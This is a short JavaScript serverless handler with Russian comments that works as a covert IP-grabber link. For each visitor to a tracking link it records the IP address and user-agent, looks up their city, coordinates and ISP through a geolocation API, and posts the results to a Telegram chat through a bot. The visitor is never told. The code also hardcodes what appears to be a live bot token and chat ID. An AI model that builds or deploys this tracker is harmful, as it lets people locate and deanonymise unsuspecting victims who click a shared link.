export default async function handler(req, res) {
  // Получаем IP-адрес, пробуя несколько способов
  const ip = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(',')[0] : req.socket.remoteAddress;

  // Проверяем, если IP-адрес начинается с '::ffff:', удаляем это, так как это может быть IPv6
  const realIP = ip.startsWith('::ffff:') ? ip.slice(7) : ip;

  // Получаем user-agent
  const ua = req.headers["user-agent"] || "N/A";
  const slug = req.query.slug || "неизвестно";

  let geo = {};
  try {
    // Запрашиваем географию по IP
    const geoRes = await fetch(`https://ip-api.com/json/${realIP}?fields=country,city,lat,lon,org,status`);
    const geoData = await geoRes.json();

    // Проверяем, успешен ли ответ от API
    if (geoData.status === 'fail') {
      geo = {
        country: "Не удалось получить данные",
        city: "Не удалось получить данные",
        lat: "Не удалось получить данные",
        lon: "Не удалось получить данные",
        org: "Не удалось получить данные"
      };
    } else {
      geo = geoData;
    }
  } catch (_) {
    geo = {
      country: "Не удалось получить данные",
      city: "Не удалось получить данные",
      lat: "Не удалось получить данные",
      lon: "Не удалось получить данные",
      org: "Не удалось получить данные"
    };
  }

  // Формируем сообщение для отправки в Telegram
  const message = `
🔗 Ссылка: ${slug}
🌍 IP: \`${realIP}\`
📍 Страна: \`${geo.country || "?"}\`
🏙️ Город: \`${geo.city || "?"}\`
🧭 Координаты: \`${geo.lat || "?"}\`, \`${geo.lon || "?"}\`
🌐 Провайдер: \`${geo.org || "?"}\`
🕰️ Локальное время: \`${new Date().toLocaleString()}\`
💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
🧾 UA: \`${ua}\`
  `.trim();

  const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
  const chatId = "2079893058";

  // Отправляем сообщение в Telegram
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
  });

  // Отправляем ответ
  res.status(200).json({ ok: true });
}
